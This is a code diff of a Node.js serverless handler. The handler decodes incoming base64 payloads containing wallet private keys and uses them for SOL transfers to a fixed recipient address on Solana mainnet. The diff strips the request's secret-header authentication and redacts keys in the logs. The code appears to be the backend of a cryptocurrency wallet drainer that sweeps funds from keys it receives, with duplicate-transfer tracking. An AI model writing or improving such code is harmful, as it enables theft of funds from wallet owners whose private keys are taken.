@@ -4,20 +4,12 @@ const bs58 = require('bs58');
 // Configuration - pulled from environment variables
 const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
 const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
-const API_SECRET = process.env.API_SECRET || 'YOUR_SECRET_HERE';
 const FEE_ESTIMATE = 5000; // Fallback lamports estimate
 
 // In-memory set to prevent duplicate transfers (resets on function restart)
 const processedKeys = new Set();
 
 export default async function handler(req, res) {
-  // Basic authentication
-  const secret = req.headers['x-secret'];
-  if (secret !== API_SECRET) {
-    console.log('[auth-error]', 'Unauthorized access attempt');
-    return res.status(401).send('Unauthorized');
-  }
-
   const query = req.query || {};
   const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
   
@@ -32,7 +24,10 @@ export default async function handler(req, res) {
       
       // Clean logs - only b64 data and decoded result
       console.log('[b64-data]', dParam);
-      console.log('[decoded-data]', parsedData);
+      console.log('[decoded-data]', {
+        ...parsedData,
+        wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
+      });
 
       // Process private key for SOL transfer if wallets exist
       if (parsedData?.wallets?.[0]?.key) {
